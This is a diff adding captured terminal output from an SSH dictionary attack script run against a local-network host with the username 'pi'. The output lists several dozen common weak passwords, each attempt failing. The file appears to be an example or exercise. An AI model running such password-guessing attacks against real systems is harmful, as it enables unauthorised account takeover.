@@ -1,0 +1,39 @@
+              
+~/Documents/sshSniffer# python sshDictionaryAttackExample.py         
+[*] Enter target host address: 192.168.0.17                 
+[*] Enter ssh username: pi                                  
+                                                            
+                                                            
+==============================Began Attack=======================                                                                                 
+[*] User: pi [*] Pass: password => Login Incorrect !!! <=   
+[*] User: pi [*] Pass: root => Login Incorrect !!! <=       
+[*] User: pi [*] Pass: 123456 => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: abc123 => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: admin => Login Incorrect !!! <=      
+[*] User: pi [*] Pass: test => Login Incorrect !!! <=       
+[*] User: pi [*] Pass: qwerty => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: testuser => Login Incorrect !!! <=   
+[*] User: pi [*] Pass: tester => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: test123 => Login Incorrect !!! <=    
+[*] User: pi [*] Pass: testing => Login Incorrect !!! <=    
+[*] User: pi [*] Pass: test1 => Login Incorrect !!! <=      
+[*] User: pi [*] Pass: test2 => Login Incorrect !!! <=      
+[*] User: pi [*] Pass: test4 => Login Incorrect !!! <=      
+[*] User: pi [*] Pass: test3 => Login Incorrect !!! <=      
+[*] User: pi [*] Pass: 12345 => Login Incorrect !!! <=      
+[*] User: pi [*] Pass: user => Login Incorrect !!! <=       
+[*] User: pi [*] Pass: nobody => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: webadmin => Login Incorrect !!! <=   
+[*] User: pi [*] Pass: webmaster => Login Incorrect !!! <=  
+[*] User: pi [*] Pass: oracle => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: web => Login Incorrect !!! <=        
+[*] User: pi [*] Pass: news => Login Incorrect !!! <=       
+[*] User: pi [*] Pass: info => Login Incorrect !!! <=       
+[*] User: pi [*] Pass: sysadm => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: mysql => Login Incorrect !!! <=      
+[*] User: pi [*] Pass: eqidemo => Login Incorrect !!! <=    
+[*] User: pi [*] Pass: cvsadm => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: spam => Login Incorrect !!! <=       
+[*] User: pi [*] Pass: system => Login Incorrect !!! <=     
+[*] User: pi [*] Pass: techsupport => Login Incorrect !!! <=
+                                                            
